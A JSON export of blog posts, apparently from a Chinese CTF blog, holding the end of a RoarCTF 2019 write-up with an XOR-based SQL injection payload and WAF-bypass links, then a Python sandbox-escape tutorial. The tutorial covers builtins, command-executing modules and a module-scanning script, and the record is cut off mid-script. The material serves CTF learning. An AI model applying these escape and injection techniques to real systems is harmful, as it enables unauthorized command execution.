然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","text":"roarctf 201910/16/2019 4:45:49 PM easy_java拿到题目看到文件下载的接口，尝试 /Download?filename=help.docx ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 SSTI ?fuzz了","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"python沙盒逃逸:从头开始","slug":"python沙箱逃逸","date":"2019-10-11T06:26:44.000Z","updated":"2019-10-14T12:20:33.712Z","comments":true,"path":"api/articles/python沙箱逃逸.json","excerpt":"","keywords":null,"cover":"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg","content":"<p>10/11/2019 2:26:44 PM </p>\n<h1 id=\"Python-沙箱逃逸你真的看懂了么？\"><a href=\"#Python-沙箱逃逸你真的看懂了么？\" class=\"headerlink\" title=\"Python 沙箱逃逸你真的看懂了么？\"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p>\n<p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p>\n<p>接下来让我们先了解一下 python 的两个非常重要的东西</p>\n<h2 id=\"type-amp-object\"><a href=\"#type-amp-object\" class=\"headerlink\" title=\"type &amp; object\"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p>\n<pre><code>&gt;&gt;&gt; object\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; type\n&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p>\n<p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p>\n<pre><code>&gt;&gt;&gt; object.__class__\n&lt;type &apos;type&apos;&gt;\n\n&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类\n()\n\n&gt;&gt;&gt; type.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__    #type 的类型是自己\n&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p>\n<pre><code>&gt;&gt;&gt; list.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__\n&lt;type &apos;type&apos;&gt;\n&gt;&gt;&gt; dict.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; dict.__class__\n&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p>\n<p>我们把他们放在一个表里看看：</p>\n<p><img src=\"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg\" alt></p>\n<p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p>\n<h2 id=\"builtin、builtins、builtins-是什么？\"><a href=\"#builtin、builtins、builtins-是什么？\" class=\"headerlink\" title=\"builtin、builtins、builtins 是什么？\"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p>\n<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p>\n<p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p>\n<pre><code>&gt;&gt;&gt; import __builtin__\n&gt;&gt;&gt; def print_hello():\n...     print &quot;hello world!&quot;\n...\n&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello\n&gt;&gt;&gt; print_hello()\nhello world!\n&gt;&gt;&gt; hello()\nhello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p>\n<p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p>\n<p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p>\n<ol>\n<li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li>\n<li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li>\n</ol>\n<p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p>\n<pre><code>&gt;&gt;&gt; dir(__builtins__)\n[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p>\n<p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p>\n<h2 id=\"Python-有哪些可以执行系统命令呢？\"><a href=\"#Python-有哪些可以执行系统命令呢？\" class=\"headerlink\" title=\"Python 有哪些可以执行系统命令呢？\"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p>\n<p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p>\n<pre><code>#-*- coding:utf8 -*-\n# By Macr0phag3\n# in 2019-05-07 19:46:12\n# ------------------------------------\n\n# this, antigravity 库删掉\nall_modules_2 = [\n    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;\n]\n\nall_modules_3 = [\n    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;\n]\n\nmethods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]\n\nresults = {}\nfor module in all_modules_3:\n    results[module] = {\n        &apos;flag&apos;: 0,\n        &apos;result&apos;: {}\n    }\n\n    try:\n        m = __import__(module)\n        attrs = dir(m)\n        for method in methods:\n            if method in attrs:\n                result = &apos;yes&apos;\n                results[module][&apos;flag&apos;] = 1\n            else:\n                result = &apos;no&apos;\n\n            results[module][&apos;result&apos;][method] = result\n\n    except Exception as e:\n        print(e)\n\nfor result in results:\n    if results[result][&apos;flag&apos;]:\n        